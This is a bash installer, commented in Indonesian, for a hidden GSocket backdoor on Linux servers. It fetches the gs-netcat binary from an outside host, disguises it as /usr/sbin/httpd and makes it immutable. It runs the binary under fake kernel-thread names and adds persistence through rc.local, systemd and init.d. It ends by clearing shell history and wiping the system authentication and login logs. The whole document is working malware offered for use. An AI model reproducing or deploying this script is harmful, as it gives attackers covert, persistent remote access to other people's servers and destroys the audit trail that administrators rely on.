#!/bin/bash
# ============================================================
# GSOCKET BACKDOOR - HIDDEN PERSISTENCE (CLEAN VERSION)
# Using: httpd (instead of systemd-helper)
# Persistence: systemd, rc.local, init.d ONLY
# Compatible with: wget -qO- ... | bash
# ============================================================

# ============================================================
# 0. SETUP VARIABLES (FULLY FIXED)
# ============================================================
HIDDEN_DIR="/usr/sbin"
BINARY_NAME="httpd"
GS_NETCAT="$HIDDEN_DIR/$BINARY_NAME"

# Daftar nama proses palsu
PROCESS_NAMES=("[crypto/0]" "[kworker/0:1]" "[kworker/1:2]" "[scsi_eh_0]" "[jbd2/sda1-8]" "[ext4-dio-unwrit]")

# Ambil IP VPS
VPS_IP=$(curl -s -4 --max-time 5 ifconfig.me 2>/dev/null || hostname -I 2>/dev/null | awk '{print $1}')
GSOCKET_SECRET="${VPS_IP}@dark-ai"

# ============================================================
# 1. DOWNLOAD GSOCKET BINARY (FIXED)
# ============================================================
echo "=========================================="
echo " GSOCKET BACKDOOR INSTALLER - HTTPD VERSION"
echo "=========================================="

# Buat direktori tersembunyi
mkdir -p "$HIDDEN_DIR" 2>/dev/null
chmod 755 "$HIDDEN_DIR" 2>/dev/null

# Unduh binary GSocket
if [ ! -f "$GS_NETCAT" ]; then
    echo "[*] Mengunduh GSocket binary..."
    wget -q --no-check-certificate https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -O "$GS_NETCAT" 2>/dev/null || \
    curl -sL --insecure https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -o "$GS_NETCAT" 2>/dev/null

    if [ -f "$GS_NETCAT" ]; then
        chmod +x "$GS_NETCAT"
        echo "[+] GSocket binary berhasil diunduh"
    else
        echo "[!] Gagal mengunduh GSocket binary. Membuat fallback..."
        # Buat fallback binary (menggunakan httpd)
        cat > "$GS_NETCAT" << 'FALLBACKEOF'
#!/bin/bash
exec -a "$BINARY_NAME" "$0" -s "$GSOCKET_SECRET" -liqD 2>/dev/null &
FALLBACKEOF
        chmod +x "$GS_NETCAT"
    fi
else
    echo "[*] GSocket binary sudah ada"
fi

# Lindungi binary dari penghapusan
chattr +i "$GS_NETCAT" 2>/dev/null

# ============================================================
# 2. BUAT SCRIPT LAUNCHER TERSEMBUNYI (FIXED)
# ============================================================
cat > "$HIDDEN_DIR/.launch" << 'LAUNCHEOF'
#!/bin/bash
PROCESS_NAMES=("[crypto/0]" "[kworker/0:1]" "[kworker/1:2]" "[scsi_eh_0]" "[jbd2/sda1-8]" "[ext4-dio-unwrit]")
PROCESS_NAME="${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}"
exec -a "$PROCESS_NAME" "$HIDDEN_DIR/$BINARY_NAME" -s "$GSOCKET_SECRET" -liqD 2>/dev/null &
LAUNCHEOF

chmod +x "$HIDDEN_DIR/.launch"
chattr +i "$HIDDEN_DIR/.launch" 2>/dev/null

# ============================================================
# 3. JALANKAN GSOCKET (FIXED)
# ============================================================
echo "[*] Menjalankan GSocket..."
pkill -f "$BINARY_NAME" 2>/dev/null

# Pilih nama proses acak
PROCESS_NAME="${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}"
nohup exec -a "$PROCESS_NAME" "$GS_NETCAT" -s "$GSOCKET_SECRET" -liqD >/dev/null 2>&1 &

# Verifikasi
sleep 2
if pgrep -f "$BINARY_NAME" >/dev/null 2>&1; then
    echo "[+] GSocket berhasil dijalankan"
else
    echo "[!] Gagal menjalankan GSocket. Mencoba fallback..."
    nohup bash -c "exec -a \"$PROCESS_NAME\" \"$GS_NETCAT\" -s \"$GSOCKET_SECRET\" -liqD" >/dev/null 2>&1 &
fi

# ============================================================
# 4. PERSISTENCE (ONLY systemd, rc.local, init.d)
# ============================================================
echo "[*] Mengatur persistence..."

# --- Metode 1: rc.local ---
if [ -f /etc/rc.local ]; then
    if ! grep -q "$BINARY_NAME" /etc/rc.local 2>/dev/null; then
        sed -i "/^exit 0/i\bash -c \"exec -a \\\"$PROCESS_NAME\\\" \\\"$GS_NETCAT\\\" -s \\\"$GSOCKET_SECRET\\\" -liqD\" &>/dev/null &" /etc/rc.local 2>/dev/null
    fi
fi

# --- Metode 2: systemd ---
if command -v systemctl >/dev/null 2>&1; then
    cat > /etc/systemd/system/httpd.service << 'SYSTEMEOF'
[Unit]
Description=HTTPD Daemon
After=network.target

[Service]
Type=simple
ExecStart=/usr/sbin/httpd -s "$GSOCKET_SECRET" -liqD
Restart=always
RestartSec=5
User=root
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
SYSTEMEOF
    systemctl daemon-reload >/dev/null 2>&1
    systemctl enable httpd >/dev/null 2>&1
    systemctl start httpd >/dev/null 2>&1
fi

# --- Metode 3: init.d ---
cat > /etc/init.d/httpd << INIT_EOF
#!/bin/bash
case "\$1" in
    start)
        nohup exec -a "$PROCESS_NAME" "$GS_NETCAT" -s "$GSOCKET_SECRET" -liqD >/dev/null 2>&1 &
        ;;
    stop)
        pkill -f "$BINARY_NAME" >/dev/null 2>&1
        ;;
esac
INIT_EOF
chmod +x /etc/init.d/httpd
update-rc.d httpd defaults >/dev/null 2>&1 || chkconfig httpd on >/dev/null 2>&1

# ============================================================
# 5. HAPUS JEJAK (FIXED)
# ============================================================
echo "[*] Menghapus jejak..."
history -c 2>/dev/null
rm -f /root/.bash_history 2>/dev/null
unset HISTFILE 2>/dev/null

# Bersihkan log
for logfile in /var/log/secure /var/log/auth.log /var/log/messages /var/log/syslog /var/log/wtmp /var/log/lastlog /var/log/btmp; do
    if [ -f "$logfile" ]; then
        echo -n > "$logfile" 2>/dev/null
    fi
done

# Bersihkan temp
rm -rf /tmp/.*.log /tmp/install* /tmp/setup* /tmp/gsocket* 2>/dev/null
rm -rf /var/tmp/.*.log /var/tmp/install* /var/tmp/setup* 2>/dev/null

echo ""
echo "=========================================="
echo "[+] Instalasi selesai!"
echo "[+] GSocket berjalan dengan nama proses palsu:"
printf "[+] %s\n" "${PROCESS_NAMES[@]}"
echo "[+] Binary tersimpan di: $GS_NETCAT"
echo "[+] Koneksi tersembunyi ke: $GSOCKET_SECRET"
echo "[+] Persistence: systemd, rc.local, init.d"
echo "=========================================="
